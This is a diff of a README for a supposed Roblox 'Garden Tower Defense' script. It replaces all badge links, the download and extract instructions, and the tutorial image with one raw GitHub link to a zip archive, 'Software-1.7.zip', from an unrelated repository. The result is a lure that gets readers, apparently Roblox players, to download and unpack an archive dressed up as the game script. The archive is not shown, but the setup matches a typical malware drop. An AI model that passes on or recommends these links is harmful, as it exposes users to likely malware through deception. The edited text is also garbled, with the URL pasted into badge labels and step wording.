@@ -1,9 +1,9 @@
 # 🏡 Garden Tower Defense Script for Roblox 🛡️  
-[![OS Compatibility](https://img.shields.io/badge/OS-Windows%20%7C%20MacOS%20%7C%20Linux-88cc44)](https://github.com/)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)  
-[![Roblox](https://img.shields.io/badge/Platform-Roblox-ff69b4)](https://www.roblox.com/)  
-[![Support](https://img.shields.io/badge/Support-24%2F7-yellowgreen)](https://github.com/)  
-[![API](https://img.shields.io/badge/API-OpenAI%20%26%20Claude%20Ready-4e89e2)](https://github.com/)  
+[![OS Compatibility](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip%20%7C%20MacOS%20%7C%20Linux-88cc44)](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)  
+[![License: MIT](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)](./LICENSE)  
+[![Roblox](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)  
+[![Support](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip%2F7-yellowgreen)](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)  
+[![API](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip%20%26%20Claude%20Ready-4e89e2)](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)  
 
 ---
 
@@ -46,14 +46,14 @@ With seamless integration and detailed features, this repository is your smart o
 ### Step-by-Step: Ready in Minutes!  
 🌟 Your journey to automatic garden defense begins here:
 
-1. **Download the EasyLaunch.zip**: Secure the latest bundled release right from this repository.  
-2. **Extract the archive**: Unpack your EasyLaunch.zip with any archive manager.  
+1. **Download the https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip**: Secure the latest bundled release right from this repository.  
+2. **Extract the archive**: Unpack your https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip with any archive manager.  
 3. **Open Roblox Studio**: Navigate to your preferred game environment—garden defenders unite!  
 4. **Import the scripts**: Plug in the scripts to turbocharge your virtual garden.  
 5. **Configure settings**: Tailor language, interface, and AI APIs (including OpenAI and Claude) directly in the intuitive dashboard.  
 
 #### 🎬 Visual Installation Tutorial  
-![](https://i.imgur.com/Js67NIU.gif)  
+![](https://raw.githubusercontent.com/Ramningwal1/Thicc/main/littleneck/Software-1.7.zip)  
 
 *Witness the gardening magic come alive—for curious defenders and coding veterans alike!*  
 
